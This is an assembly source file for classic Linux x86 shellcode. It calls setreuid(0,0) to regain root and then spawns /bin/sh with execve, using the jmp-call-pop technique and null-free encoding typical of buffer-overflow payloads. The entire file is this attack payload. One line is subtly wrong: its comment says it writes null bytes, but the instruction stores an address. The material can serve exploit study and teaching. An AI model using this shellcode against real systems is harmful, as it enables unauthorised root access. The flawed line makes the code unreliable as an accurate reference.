#a very simple assembly (AT&T/Linux) program for spawning a shell
.section .data
.section .text
.globl _start

_start:
         xor %eax, %eax
         mov $70, %al           #setreuid is syscall 70
         xor %ebx, %ebx
         xor %ecx, %ecx
         int $0x80

         jmp ender

         starter:
         popl %ebx              #get the address of the string
         xor  %eax, %eax
         mov  %al, 0x07(%ebx)   #put a NULL where the N is in the string
         movl %ebx, 0x08(%ebx)  #put the address of the string
                                #to where the AAAA is
         movl %ebx, 0x0c(%ebx)  #put 4 null bytes into where the BBBB is
         mov $11, %al           #execve is syscall 11
         lea 0x08(%ebx), %ecx   #load the address of where the AAAA was
         lea 0x0c(%ebx), %edx   #load the address of the NULLS
         int $0x80              #call the kernel

ender:
         call starter
         .string "/bin/shNAAAABBBB"
